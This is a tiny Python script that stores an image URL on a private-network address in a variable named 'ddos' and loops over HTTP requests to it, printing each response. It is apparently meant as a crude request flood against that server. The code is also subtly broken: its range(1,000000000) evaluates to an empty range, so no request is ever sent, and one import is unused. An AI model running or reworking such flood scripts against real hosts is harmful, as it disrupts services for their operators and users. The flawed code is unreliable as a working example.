from email.mime import image
import urllib.request

ddos = "http://192.168.0.101/assets/images/demo/s12.jpg"

for x in range(1,000000000):
    # Execute HTTP Request
    req = urllib.request.Request(ddos)
    jpeg = urllib.request.urlopen(req).read()
    print(jpeg)
    
